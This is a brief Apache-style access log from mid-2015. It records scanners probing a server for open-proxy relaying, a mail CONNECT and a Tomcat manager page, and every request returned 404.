115.231.222.40 - - [31/Jul/2015:16:50:53 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2084103208474897 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [31/Jul/2015:17:16:34 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2576265286211209 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
91.226.212.39 - - [31/Jul/2015:18:23:20 +0200] "GET / HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
115.231.222.40 - - [31/Jul/2015:19:21:40 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0347146376525980 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [31/Jul/2015:19:21:41 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1778126221588333 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [31/Jul/2015:21:43:25 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9038192860878926 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
36.229.236.145 - - [31/Jul/2015:21:48:24 +0200] "CONNECT 126mx00.mxmail.netease.com:25 HTTP/1.0" 404 740 "-" "-"
115.231.222.40 - - [31/Jul/2015:21:57:39 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7110005147068758 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [31/Jul/2015:23:58:20 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1351937604613261 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [01/Aug/2015:04:36:08 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5021108544159935 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.8 - - [01/Aug/2015:06:54:33 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8761319515982252 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [01/Aug/2015:11:41:32 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5891242637005511 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.248.2 - "" [01/Aug/2015:12:05:02 +0200] "GET /manager/html HTTP/1.1" 404 674 "-" "Mozilla/3.0 (compatible; Indy Library)"
115.239.228.8 - - [01/Aug/2015:18:12:04 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4227926603205186 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
66.186.188.227 - - [01/Aug/2015:18:50:47 +0200] "HEAD / HTTP/1.1" 404 182 "-" "-"
66.186.188.227 - - [01/Aug/2015:18:50:47 +0200] "GET / HTTP/1.1" 404 674 "-" "-"
91.236.75.4 - - [01/Aug/2015:19:21:39 +0200] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 674 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
115.231.222.40 - - [01/Aug/2015:19:35:22 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9363754030581479 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.231.222.40 - - [01/Aug/2015:22:22:18 +0200] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8480971032132160 HTTP/1.1" 404 729 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
185.25.151.159 - - [01/Aug/2015:23:40:51 +0200] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 674 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
